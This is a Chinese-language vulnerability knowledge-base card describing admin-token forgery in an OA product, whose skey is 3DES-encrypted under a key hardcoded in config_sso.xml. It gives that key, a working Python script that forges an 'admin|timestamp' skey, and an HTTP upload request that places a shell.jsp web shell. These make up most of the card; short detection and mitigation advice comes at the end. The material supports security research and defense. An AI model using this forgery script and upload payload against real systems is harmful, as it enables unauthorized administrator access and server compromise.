---
id: web-generic-auth-oa-skey-3des-admin-token-forgery
title: OA skey 3DES 令牌伪造：admin|时间戳 + 配置硬编码密钥绕过 Auth/getUserName
type: scenario
domain: web
path: web/generic/auth
technique: oa-skey-3des-token-forgery
aliases:
- OA skey 伪造
- skey 3DES 加密
- Privilege.Auth 绕过
- admin|时间戳
- ThreeDesUtil.decrypthexstr
- 红帆 OA skey
tags:
- java
- oa
- 3des
- token-forgery
- auth-bypass
- hardcoded-secret
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V32
  verified_at: '2026-11-05T06:02:13+08:00'
  notes: 已对照原文与截图核对：Privilege.Auth/getUserName 3DES解密skey、lastIndexOf('|')取时间戳20分钟窗口、config_sso.xml key 000017697893609873688931、admin|毫秒明文生成脚本与截图中skey一致；原文未给产品版本，未设置versions；PoC未复现
---

## 一句话结论

某 OA 的 `Privilege.Auth(skey)` / `getUserName(skey)` 把请求中的 `skey` 当作 3DES 密文，用 `config_sso.xml` 中的固定 24 字节密钥解密，明文格式为 `用户名|毫秒时间戳`；密钥硬编码且在源码/配置泄露后可知，攻击者即可为任意用户（如 `admin`）生成 20 分钟内有效的 `skey`，绕过上传等接口的“认证”。

## 原理

- **入口**：上传类 Action（如 `FilecaseUploadAction`、`NetdiskUploadAction`）在 `execute` 中取 `this.getSkey()`，先 `privilege.Auth(skey)`，再 `privilege.getUserName(skey)` 得到用户名并加载 `UserDb`。
- **Auth 逻辑**：
  ```java
  String str = ThreeDesUtil.decrypthexstr((String)ssocfg.get("key"), (String)skey);
  int index = str.lastIndexOf("|");
  String sTime = str.substring(index + 1, str.length());
  long time = now.getTime() - StrUtil.toLong(sTime, now.getTime());
  long time1 = time / 1000L / 60L;
  if (time1 > 20) { return true; }  // 超时返回 true，调用方拒绝
  return false;
  ```
  `Auth` 只校验“密文能解密 + `|` 后时间戳不超过 20 分钟”；不校验用户是否存在、是否有权限，也不绑定会话/IP。
- **getUserName 逻辑**：同样 3DES 解密，取 `str.indexOf("|")` 之前的内容作为用户名。因此只要构造 `admin|<当前毫秒>` 并用同一密钥加密，`Auth` 返回 false（未超时），`getUserName` 返回 `admin`，后续 `user.getUserDb("admin")` 以管理员身份继续。
- **密钥来源**：`Config` 读取 `config_sso.xml`，其中 `<key>` 为 24 位字符串（原文为 `000017697893609873688931`）；`ThreeDesUtil.decryptMode` 使用 `Cipher.getInstance("DESede")`、`SecretKeySpec`、ECB/PKCS5 解密，`decrypthexstr` 先把 hex 字符串转字节再解密。
- **为什么可伪造**：3DES 是对称加密，密钥同时用于加解密；源码泄露/配置文件读取/备份泄露都能拿到 key。即使黑盒，若 key 固定且产品通用，也可从公开源码/其他实例获取。
- **时效**：`skey` 只在 20 分钟内有效，需在生成后立即使用；服务器时间与攻击者时间偏差会影响判断。

## 触发条件

- 目标为使用该 OA 代码库的应用，存在 `Privilege.Auth`/`getUserName` 与 `skey` 参数的接口（上传、部分 API）。
- 攻击者知道 `config_sso.xml` 中的 24 字节 3DES key（源码泄露、配置文件读取、默认 key、备份等）。
- 目标时间与攻击者时间大致同步；生成的 `skey` 在 20 分钟窗口内。
- 接口未额外校验会话/IP/验证码。

## 利用步骤

1. 获取 key：审计源码 `config_sso.xml` 的 `<key>`，或通过文件读取/备份获取；确认目标 JSON 返回/错误信息使用同一 key。
2. 生成明文 `用户名|当前毫秒时间戳`（如 `admin|1769838826243`）。
3. 用 3DES-ECB + PKCS5 填充加密，输出大写 hex，得到 `skey`。
4. 在请求的 `skey` 字段中提交（上传接口通常是 multipart 的 `skey` 字段），并在 20 分钟内完成操作。
5. 观察接口是否按 `admin` 身份继续（如上传成功、返回管理员可见的数据）。

## PoC

原文 skey 生成脚本：

```python
from Crypto.Cipher import DES3
import binascii
import time

def generate_dynamic_skey(key_str, username):
    key = key_str.encode('utf-8')
    timestamp = str(int(time.time() * 1000))
    plain_text = f"{username}|{timestamp}"
    print(f"[*] 待加密明文: {plain_text}")

    bs = 8
    padding_len = bs - (len(plain_text.encode('utf-8')) % bs)
    plain_text_padded = plain_text + (chr(padding_len) * padding_len)

    cipher = DES3.new(key, DES3.MODE_ECB)
    encrypt_bytes = cipher.encrypt(plain_text_padded.encode('utf-8'))
    return binascii.hexlify(encrypt_bytes).decode('utf-8').upper()

KEY = "000017697893609873688931"
USER = "admin"
print(f"[+] 生成的最新 skey: {generate_dynamic_skey(KEY, USER)}")
```

输出示例：

```text
[*] 待加密明文: admin|1769838826243
[+] 生成的最新 skey: E3FFCEF20E21F52B3168D99C1F620F58498C2AF158BC0259
```

提交（上传接口示例）：

```http
POST /oa/filecase/upload HTTP/1.1
Host: target:8088
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCheck

------WebKitFormBoundaryCheck
Content-Disposition: form-data; name="skey"

E3FFCEF20E21F52B3168D99C1F620F58498C2AF158BC0259
------WebKitFormBoundaryCheck
Content-Disposition: form-data; name="dircode"

camera
------WebKitFormBoundaryCheck
Content-Disposition: form-data; name="title"

Test Upload
------WebKitFormBoundaryCheck
Content-Disposition: form-data; name="upload"; filename="shell.jsp"
Content-Type: application/octet-stream

<% ... %>
------WebKitFormBoundaryCheck--
```

## 变体与关联

- **key 变更**：不同部署可能修改 `config_sso.xml` 的 key；若已知默认 key，先尝试默认值。
- **时间格式**：`lastIndexOf("|")` 取最后一个分隔符后的时间戳；用户名中若含 `|` 也能工作（`getUserName` 取第一个 `|` 前），但通常用 `admin|timestamp`。
- **其他使用点**：任何调用 `Privilege.Auth`/`getUserName` 的接口都可用同一伪造 `skey`；上传只是原文演示。
- 关联卡片：[[web-generic-file-upload-oa-skey-filecase-netdisk-notice]]（本链的上传利用）。

## 检测与防御

- **密钥**：不要把 3DES key 硬编码在 `config_sso.xml`/源码；改为服务端密钥管理 + 定期轮换；密钥泄露后立即轮换。
- **令牌**：使用带签名（HMAC/RSA）和短有效期的服务端令牌，绑定用户、会话、IP/设备；不要仅凭“可解密 + 时间戳”认定身份。
- **检测**：`skey` 长度为固定 hex、解密后含 `admin|`/`|` + 13 位毫秒时间戳；同一 `skey` 在不同 IP/设备复用；上传接口在无登录会话时出现 `skey`。
- **应急**：轮换 key 使历史 skey 失效；审计使用 `skey` 的接口日志；排查是否已利用 `admin` 身份执行上传/配置修改。
